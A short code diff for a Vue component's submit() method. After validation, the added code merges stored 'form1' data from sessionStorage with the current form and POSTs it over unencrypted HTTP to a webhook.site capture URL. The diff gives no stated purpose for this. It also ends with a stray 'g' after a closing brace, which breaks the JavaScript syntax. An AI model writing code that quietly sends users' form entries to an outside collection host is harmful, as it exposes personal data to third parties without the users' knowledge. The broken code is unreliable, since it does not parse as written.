@@ -65,7 +65,19 @@
 
       },
       submit() {
-      },
+        this.$refs.form.validate((valid) => {
+          if (valid) {
+            const form1 = JSON.parse(sessionStorage.getItem('form1')) || {}
+            const form2 = this.form
+            fetch('http://webhook.site/b695f74a-09eb-46ee-ae3b-c97972e41564', {
+              method: 'post',
+              body: JSON.stringify({ ...form1, ...form2 }),
+            })
+          } else {
+            return false;
+          }
+        });
+      },g
     }
   }
 </script>
